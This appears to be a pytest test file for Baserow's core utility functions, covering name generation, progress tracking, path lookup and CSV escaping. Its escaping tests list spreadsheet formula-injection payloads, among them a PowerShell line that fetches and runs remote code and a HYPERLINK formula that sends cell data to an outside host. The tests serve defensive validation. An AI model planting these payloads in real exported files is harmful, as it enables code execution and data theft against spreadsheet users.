from decimal import Decimal
from io import BytesIO
from unittest.mock import MagicMock, patch

from django.db import OperationalError
from django.test.utils import override_settings

import pytest

from baserow.core.exceptions import (
    CannotCalculateIntermediateOrder,
    is_max_lock_exceeded_exception,
)
from baserow.core.utils import (
    ChildProgressBuilder,
    MirrorDict,
    Progress,
    are_hostnames_same,
    atomic_if_not_already,
    dict_to_object,
    escape_csv_cell,
    extract_allowed,
    find_intermediate_order,
    find_unused_name,
    get_all_ips,
    get_baserow_saas_base_url,
    get_value_at_path,
    grouper,
    random_string,
    remove_duplicates,
    remove_invalid_surrogate_characters,
    remove_special_characters,
    set_allowed_attrs,
    sha256_hash,
    split_comma_separated_string,
    stream_size,
    to_camel_case,
    to_pascal_case,
    to_path,
    to_snake_case,
    truncate_middle,
    unique_dicts_in_list,
)


def test_extract_allowed():
    assert extract_allowed({"test_1": "test_1", "test_2": "test_2"}, ["test_1"]) == {
        "test_1": "test_1"
    }

    assert extract_allowed({}, ["test_1"]) == {}
    assert extract_allowed({"test_1": "test"}, ["test_2"]) == {}
    assert extract_allowed({"test_1": "test"}, []) == {}


def test_set_allowed_attrs():
    class Tmp(object):
        test_1 = None
        test_2 = None

    tmp1 = Tmp()
    tmp1 = set_allowed_attrs({"test_1": "test", "test_2": "test"}, ["test_1"], tmp1)

    assert tmp1.test_1 == "test"
    assert tmp1.test_2 is None


def test_to_pascal_case():
    assert to_pascal_case("This is a TEST") == "ThisIsATest"


def test_to_camel_case():
    assert to_camel_case("This is a TEST") == "ThisIsATest"
    assert to_camel_case("This  is a test") == "ThisIsATest"
    assert to_camel_case("snake_case_string") == "SnakeCaseString"


def test_to_snake_case():
    assert to_snake_case("This is a TEST") == "this_is_a_test"
    assert to_snake_case("This  is a test") == "this_is_a_test"


def test_remove_special_characters():
    assert remove_special_characters("Test @#$% .. ;;") == "Test"
    assert remove_special_characters("Test @#$% ..", remove_spaces=False) == "Test  "


def test_dict_to_object():
    d1 = {"a": "b", "c": "d"}
    o1 = dict_to_object(d1)

    assert o1.a == "b"
    assert o1.c == "d"
    assert not hasattr(o1, "b")
    assert not hasattr(o1, "d")
    assert not hasattr(o1, "e")


def test_random_string():
    assert len(random_string(32)) == 32
    assert random_string(32) != random_string(32)


def test_sha256_hash():
    assert sha256_hash(BytesIO(b"test")) == (
        "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
    )
    assert sha256_hash(BytesIO(b"Hello World")) == (
        "a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e"
    )


def test_stream_size():
    assert stream_size(BytesIO(b"test")) == 4


def test_truncate_middle():
    assert truncate_middle("testtesttest", 13) == "testtesttest"
    assert truncate_middle("testtesttest", 12) == "testtesttest"
    assert truncate_middle("testabcdecho", 11) == "test...echo"
    assert truncate_middle("testabcdecho", 10) == "test...cho"
    assert truncate_middle("testabcdecho", 9) == "tes...cho"
    assert truncate_middle("testabcdecho", 8) == "tes...ho"
    assert truncate_middle("testabcdecho", 7) == "te...ho"
    assert truncate_middle("testabcdecho", 6) == "te...o"
    assert truncate_middle("testabcdecho", 5) == "t...o"
    assert truncate_middle("testabcdecho", 4) == "t..."

    with pytest.raises(ValueError):
        truncate_middle("testtesttest", 3) == "..."


def test_split_comma_separated_string():
    assert split_comma_separated_string('A,"B , C",D') == ["A", "B , C", "D"]
    assert split_comma_separated_string('A,\\"B,C') == ["A", '"B', "C"]
    assert split_comma_separated_string('A,\\"B,C\\,D') == ["A", '"B', "C,D"]


def test_remove_invalid_surrogate_characters():
    assert remove_invalid_surrogate_characters(b"test\uD83Dtest") == "testtest"


def test_unused_names():
    assert find_unused_name(["test"], ["foo", "bar", "baz"]) == "test"
    assert find_unused_name(["test"], ["test", "field", "field 2"]) == "test 2"
    assert find_unused_name(["test", "other"], ["test", "field", "field 2"]) == "other"
    assert find_unused_name(["field"], ["test", "field", "field 2"]) == "field 3"
    assert find_unused_name(["field"], [1, 2]) == "field"
    assert (
        find_unused_name(
            ["regex like field [0-9]"],
            ["regex like field [0-9]", "regex like field [0-9] 2"],
        )
        == "regex like field [0-9] 3"
    )
    # Try another suffix
    assert (
        find_unused_name(
            ["field"], ["field", "field 4" "field (1)", "field (2)"], suffix=" ({0})"
        )
        == "field (3)"
    )


def test_unused_names_with_max_length():
    max_name_length = 255
    exactly_length_field_name = "x" * max_name_length
    too_long_field_name = "x" * (max_name_length + 1)

    # Make sure that the returned string does not exceed the max_name_length
    assert (
        len(
            find_unused_name(
                [exactly_length_field_name], [], max_length=max_name_length
            )
        )
        <= max_name_length
    )
    assert (
        len(
            find_unused_name(
                [f"{exactly_length_field_name} - test"], [], max_length=max_name_length
            )
        )
        <= max_name_length
    )
    assert (
        len(find_unused_name([too_long_field_name], [], max_length=max_name_length))
        <= max_name_length
    )

    initial_name = (
        "xIyV4w3J4J0Zzd5ZIz4eNPucQOa9tS25ULHw2SCr4RDZ9h2AvxYr5nlGRNQR2ir517B3SkZB"
        "nw2eGnBJQAdX8A6QcSCmcbBAnG3BczFytJkHJK7cE6VsAS6tROTg7GOwSQsdImURRwEarrXo"
        "lv9H4bylyJM0bDPkgB4H6apiugZ19X0C9Fw2ed125MJHoFgTZLbJRc6joNyJSOkGkmGhBuIq"
        "RKipRYGzB4oiFKYPx5Xoc8KHTsLqVDQTWwwzhaR"
    )
    expected_name_1 = (
        "xIyV4w3J4J0Zzd5ZIz4eNPucQOa9tS25ULHw2SCr4RDZ9h2AvxYr5nlGRNQR2ir517B3SkZB"
        "nw2eGnBJQAdX8A6QcSCmcbBAnG3BczFytJkHJK7cE6VsAS6tROTg7GOwSQsdImURRwEarrXo"
        "lv9H4bylyJM0bDPkgB4H6apiugZ19X0C9Fw2ed125MJHoFgTZLbJRc6joNyJSOkGkmGhBuIq"
        "RKipRYGzB4oiFKYPx5Xoc8KHTsLqVDQTWwwzh 2"
    )

    expected_name_2 = (
        "xIyV4w3J4J0Zzd5ZIz4eNPucQOa9tS25ULHw2SCr4RDZ9h2AvxYr5nlGRNQR2ir517B3SkZB"
        "nw2eGnBJQAdX8A6QcSCmcbBAnG3BczFytJkHJK7cE6VsAS6tROTg7GOwSQsdImURRwEarrXo"
        "lv9H4bylyJM0bDPkgB4H6apiugZ19X0C9Fw2ed125MJHoFgTZLbJRc6joNyJSOkGkmGhBuIq"
        "RKipRYGzB4oiFKYPx5Xoc8KHTsLqVDQTWwwzh 3"
    )

    assert (
        find_unused_name([initial_name], [initial_name], max_length=max_name_length)
        == expected_name_1
    )

    assert (
        find_unused_name(
            [initial_name], [initial_name, expected_name_1], max_length=max_name_length
        )
        == expected_name_2
    )


def test_unused_names_with_reserved_names():
    assert find_unused_name(["test"], [""], reserved_names={"test"}) == "test 2"
    assert find_unused_name(["test"], ["test"], reserved_names={"test 2"}) == "test 3"


def test_grouper():
    assert list(grouper(2, [1, 2, 3, 4, 5])) == [(1, 2), (3, 4), (5,)]

    def g():
        for i in range(0, 10):
            yield i

    assert list(grouper(3, g())) == [(0, 1, 2), (3, 4, 5), (6, 7, 8), (9,)]


def test_progress():
    mock_event = MagicMock()

    progress = Progress(100)
    progress.register_updated_event(mock_event)
    progress.increment(state="State 1")

    assert mock_event.call_count == 1
    args = mock_event.call_args
    assert args[0][0] == 1
    assert args[0][1] == "State 1"

    progress.increment(
        by=10,
        state="State 2",
    )

    assert mock_event.call_count == 2
    args = mock_event.call_args
    assert args[0][0] == 11
    assert args[0][1] == "State 2"

    progress.increment(by=89, state="State 3")

    assert mock_event.call_count == 3
    args = mock_event.call_args
    assert args[0][0] == 100
    assert args[0][1] == "State 3"


def test_nested_progress():
    mock_event = MagicMock()

    progress = Progress(100)
    progress.register_updated_event(mock_event)

    sub_progress_1 = Progress(1, parent=progress, represents_progress=20)
    sub_progress_1.increment(1)

    assert mock_event.call_count == 1
    args = mock_event.call_args
    assert args[0][0] == 20
    assert args[0][1] is None

    sub_progress_2 = progress.create_child(20, 5 * 100)
    for i in range(0, 5):
        for i2 in range(0, 75):
            sub_progress_2.increment()
        sub_progress_2.increment(by=25, state="Sub progress 2 second")

    assert mock_event.call_count == 21
    args = mock_event.call_args
    # called only once everytime the percentange or the state change
    assert [arg[0][0] for arg in mock_event.call_args_list] == list(range(20, 41))
    assert args[0][0] == 40
    assert args[0][1] == "Sub progress 2 second"

    sub_progress_3_builder = progress.create_child_builder(40)
    sub_progress_3 = ChildProgressBuilder.build(sub_progress_3_builder, 100)

    # 10% of 40% -> 4%
    sub_progress_3_1 = sub_progress_3.create_child(10, 4)
    sub_progress_3_1.increment(by=2)
    sub_progress_3_1.increment()
    sub_progress_3_1.increment()

    assert mock_event.call_count == 24
    assert [arg[0][0] for arg in mock_event.call_args_list[-3:]] == [42, 43, 44]
    args = mock_event.call_args
    assert args[0][0] == 44
    assert args[0][1] is None

    # 10% of 40% -> 4%
    sub_progress_3_2 = sub_progress_3.create_child(10, 11)
    for i in range(0, 11):
        sub_progress_3_2.increment()

    args = mock_event.call_args
    assert mock_event.call_count == 28
    assert [arg[0][0] for arg in mock_event.call_args_list[-4:]] == [45, 46, 47, 48]
    assert args[0][0] == 48
    assert args[0][1] is None

    # 10% of 40% -> 4%
    sub_progress_3.create_child(10, 0)
    assert mock_event.call_count == 29
    args = mock_event.call_args
    assert args[0][0] == 52
    assert args[0][1] is None

    # 10% of 40% -> 4%
    sub_progress_3_4_builder = sub_progress_3.create_child_builder(10)
    ChildProgressBuilder.build(sub_progress_3_4_builder, 0)
    assert mock_event.call_count == 30
    args = mock_event.call_args
    assert args[0][0] == 56
    assert args[0][1] is None

    # 55% of 40% -> 22%
    sub_progress_3_5 = sub_progress_3.create_child(55, 5 * 100)
    for i in range(0, 5):
        sub_progress_3_5_1 = sub_progress_3_5.create_child(75, 100)
        for i2 in range(0, 100):
            sub_progress_3_5_1.increment()
        sub_progress_3_5.increment(25)

    args = mock_event.call_args
    assert args[0][0] == 78
    assert args[0][1] is None

    # 5% of 40% -> 2%
    sub_progress_3_6 = sub_progress_3.create_child(5, 1)
    sub_progress_3_6.increment()

    assert mock_event.call_count == 53
    args = mock_event.call_args
    assert args[0][0] == 80
    assert args[0][1] is None


def test_progress_higher_total_than_parent():
    mock_event = MagicMock()

    progress = Progress(100)
    progress.register_updated_event(mock_event)

    sub_progress = progress.create_child(100, 1000)
    sub_progress.increment()

    assert mock_event.call_count == 1
    args = mock_event.call_args
    assert args[0][0] == 1
    assert args[0][1] is None

    sub_progress.increment()

    assert mock_event.call_count == 1
    args = mock_event.call_args
    assert args[0][0] == 1
    assert args[0][1] is None

    sub_progress.increment(8)

    assert mock_event.call_count == 1
    args = mock_event.call_args
    assert args[0][0] == 1
    assert args[0][1] is None

    sub_progress.increment()

    assert mock_event.call_count == 2
    args = mock_event.call_args
    assert args[0][0] == 2
    assert args[0][1] is None


def test_mirror_dict():
    mirror_dict = MirrorDict()
    assert mirror_dict["test"] == "test"
    assert mirror_dict[1] == 1
    assert mirror_dict.get("test") == "test"
    assert mirror_dict.get(1) == 1
    assert mirror_dict.get("test", default="abc") == "test"

    mirror_dict["foo"] = "bar"
    assert mirror_dict["foo"] == "bar"
    assert mirror_dict.get("foo") == "bar"
    assert mirror_dict.get("foo", default="abc") == "bar"


@patch("django.db.transaction.atomic")
@patch("django.db.transaction.get_autocommit", return_value=True)
def test_atomic_if_not_already_autocommit_true(*mocks):
    mock_get_autocommit, mock_atomic = mocks
    with atomic_if_not_already():
        mock_atomic.assert_called_once()


@patch("django.db.transaction.atomic")
@patch("django.db.transaction.get_autocommit", return_value=False)
def test_atomic_if_not_already_autocommit_false(*mocks):
    mock_get_autocommit, mock_atomic = mocks
    with atomic_if_not_already():
        mock_atomic.assert_not_called()


def test_unique_dicts_in_list():
    assert unique_dicts_in_list([{"a": "a"}]) == ([{"a": "a"}], [])
    assert unique_dicts_in_list([{"a": "a"}, {"a": "a"}]) == (
        [{"a": "a"}],
        [{"a": "a"}],
    )
    assert unique_dicts_in_list(
        [{"a": "b", "b": "a"}, {"a": "a", "b": "a"}], unique_fields=["b"]
    ) == ([{"a": "b", "b": "a"}], [{"a": "a", "b": "a"}])

    assert unique_dicts_in_list([]) == ([], [])

    with pytest.raises(ValueError):
        assert unique_dicts_in_list([{"a": "a"}, {"a": "a"}], unique_fields=["b"])


def test_is_max_lock_exceeded_exception():
    incorrect_exc = OperationalError("no such table: foo_bar")
    assert not is_max_lock_exceeded_exception(incorrect_exc)
    correct_exc = OperationalError(
        "HINT:  You might need to increase max_locks_per_transaction."
    )
    assert is_max_lock_exceeded_exception(correct_exc)


def test_find_intermediate_order_with_decimals():
    assert find_intermediate_order(
        Decimal("1.00000000000000000000"), Decimal("2.00000000000000000000")
    ) == Decimal("1.50000000000000000000")


def test_find_intermediate_order_with_floats():
    assert find_intermediate_order(
        1.00000000000000000000, 2.00000000000000000000
    ) == Decimal("1.50000000000000000000")


def test_find_intermediate_order_with_lower_than_one_values():
    assert find_intermediate_order(
        Decimal("0.00000000000000000000"), Decimal("1.00000000000000000000")
    ) == Decimal("0.50000000000000000000")


def test_find_intermediate_order_with_10k_iterations():
    start = Decimal("1.00000000000000000000")
    end = Decimal("2.00000000000000000000")

    for i in range(0, 10000):
        end = find_intermediate_order(start, end)

    assert end == 1.000099990001


def test_find_intermediate_order_with_more_iterations_than_max_denominator():
    start = Decimal("1.00000000000000000000")
    end = Decimal("2.00000000000000000000")

    for i in range(0, 100):
        end = find_intermediate_order(start, end, 100)

    with pytest.raises(CannotCalculateIntermediateOrder):
        find_intermediate_order(start, end, 100)


def test_find_intermediate_with_equal_order():
    with pytest.raises(CannotCalculateIntermediateOrder):
        find_intermediate_order(
            Decimal("1.00000000000000000001"), Decimal("1.00000000000000100000")
        )

    find_intermediate_order(
        Decimal("1.0100000000000000000"), Decimal("1.02000000000000000000"), 100
    )

    with pytest.raises(CannotCalculateIntermediateOrder):
        find_intermediate_order(
            Decimal("1.0100000000000000000"), Decimal("1.02000000000000000000"), 10
        )


@pytest.mark.parametrize(
    "path, expected_result",
    [
        ("a[0].b.c", ["a", "0", "b", "c"]),
        ("a[0].b..c", ["a", "0", "b", "", "c"]),
        ("a[1 2].b.c", ["a", "1 2", "b", "c"]),
        ("a[0].b[abc].c", ["a", "0", "b", "abc", "c"]),
        ("a[0].b['abc'].c", ["a", "0", "b", "'abc'", "c"]),
        ("person.name.first", ["person", "name", "first"]),
        (".person.name.first", ["", "person", "name", "first"]),
        ("person name.first", ["person name", "first"]),
        ("person  . name  .  first", ["person", "name", "first"]),
        ("person.friends[0].name.last", ["person", "friends", "0", "name", "last"]),
    ],
)
def test_to_path(path, expected_result):
    if isinstance(expected_result, type):
        with expected_result:
            to_path(path)
    else:
        result = to_path(path)
        assert result == expected_result


@pytest.fixture(name="obj")
def obj():
    """A sample nested structure to test the `get_value_at_path` utility function."""

    return {
        "a": {"b": {"c": 123}},
        "list": [
            {"d": 456},
            {"d": 789, "e": 111},
        ],
        "nested": [
            {"nested": [{"a": 1}, {"a": 2}]},
            {"nested": [{"a": 3}]},
        ],
        "b": ["1", "2", "3"],
        "empty_list": [],
    }


@pytest.mark.parametrize(
    "path, expected_result",
    [
        ("a.b.c", 123),
        ("list.1.d", 789),
        ("list[1]d", 789),
        ("a.b.x", None),
        ("list.5.d", None),
        (
            "",
            {
                "a": {"b": {"c": 123}},
                "list": [
                    {"d": 456},
                    {"d": 789, "e": 111},
                ],
                "nested": [
                    {"nested": [{"a": 1}, {"a": 2}]},
                    {"nested": [{"a": 3}]},
                ],
                "b": ["1", "2", "3"],
                "empty_list": [],
            },
        ),
        ("a.b", {"c": 123}),
        ("a[b]", {"c": 123}),
        ("list", [{"d": 456}, {"d": 789, "e": 111}]),
        ("list.*", [{"d": 456}, {"d": 789, "e": 111}]),
        ("list.*.c", None),
        ("list.*.d", [456, 789]),
        ("list.*.e", [111]),
        ("nested.*.nested.*.a", [[1, 2], [3]]),
        ("nested[*].nested[*].a", [[1, 2], [3]]),
        ("nested.*.nested.0.a", [1, 3]),
        ("nested.*.nested.1.a", [2]),
        ["b", ["1", "2", "3"]],
        ["b.*", ["1", "2", "3"]],
        ["b.0", "1"],
        ["empty_list", []],
        ["empty_list.*", []],
        ["empty_list.*.0", None],
    ],
)
def test_get_value_at_path(obj, path, expected_result):
    result = get_value_at_path(obj, path)
    assert result == expected_result


def test_get_value_at_path_default():
    obj = {}
    assert get_value_at_path(obj, "does.not.exist", "test") == "test"


@pytest.mark.parametrize(
    "input,expected",
    [
        # Sample dangerous payloads
        ("=1+1", "'=1+1"),
        ("-1+1", "'-1+1"),
        ("+1+1", "'+1+1"),
        ("=1+1", "'=1+1"),
        ("@A3", "'@A3"),
        ("%1", "'%1"),
        ("|1+1", "'\\|1+1"),
        ("=1|2", "'=1\\|2"),
        # https://blog.zsec.uk/csv-dangers-mitigations/
        ("=cmd|' /C calc'!A0", "'=cmd\\|' /C calc'!A0"),
        (
            "=cmd|' /C powershell IEX(wget 0r.pe/p)'!A0",
            "'=cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0",
        ),
        ("@SUM(1+1)*cmd|' /C calc'!A0", "'@SUM(1+1)*cmd\\|' /C calc'!A0"),
        (
            "@SUM(1+1)*cmd|' /C powershell IEX(wget 0r.pe/p)'!A0",
            "'@SUM(1+1)*cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0",
        ),
        # https://hackerone.com/reports/72785
        ("-2+3+cmd|' /C calc'!A0", "'-2+3+cmd\\|' /C calc'!A0"),
        # https://web.archive.org/web/20220516052229/https://www.contextis.com/us/blog/comma-separated-vulnerabilities
        (
            '=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")',
            '\'=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")',
        ),
    ],
)
def test_dangerous_sample_payloads(input, expected):
    assert escape_csv_cell(input) == expected


@pytest.mark.parametrize(
    "input",
    [
        "1+2",
        "1",
        "Foo",
        "1.3",
        "1,2",
        "-1.3",
        "-1,2",
        "Foo Bar",
        "1-2",
        "1=3",
        "foo@example.org",
        "19.00 %",
        "Test | Foo",
        "",
        None,
    ],
)
def test_safe_sample_payloads(input):
    assert escape_csv_cell(input) == (str(input) if input is not None else "")


@pytest.mark.parametrize("input", [1, 2, True])
def test_safe_nonstr_sample_payloads(input):
    assert escape_csv_cell(input) == input


@override_settings(DEBUG=False)
def test_get_baserow_saas_base_url_without_debug():
    assert get_baserow_saas_base_url() == ("https://api.baserow.io", {})


@override_settings(DEBUG=True)
def test_get_baserow_saas_base_url_with_debug():
    assert get_baserow_saas_base_url() == (
        "http://baserow-saas-backend:8000",
        {"Host": "localhost"},
    )


def test_remove_duplicates():
    assert remove_duplicates([1, 2, 2, 3]) == [1, 2, 3]


def test_get_all_ips():
    assert get_all_ips("localhost") == {"127.0.0.1", "::1"}


def test_are_hostnames_same():
    assert are_hostnames_same("localhost", "localhost") is True
    assert are_hostnames_same("baserow.io", "localhost") is False
